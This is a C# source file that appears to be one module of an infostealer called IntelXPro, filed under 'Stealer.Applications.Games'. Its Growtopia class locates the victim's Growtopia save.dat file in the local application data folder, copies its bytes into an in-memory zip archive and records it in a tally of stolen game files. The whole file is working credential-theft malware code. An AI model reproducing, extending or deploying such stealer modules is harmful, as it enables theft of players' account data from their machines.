using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class Growtopia : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Growtopia", "save.dat");
            if (File.Exists(text))
            {
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Growtopia";
                string text2 = "Growtopia\\save.dat";
                zip.AddFile(text2, File.ReadAllBytes(text));
                counterApplications.Files.Add(text + " => " + text2);
                counter.Games.Add(counterApplications);
            }
        }
    }

}
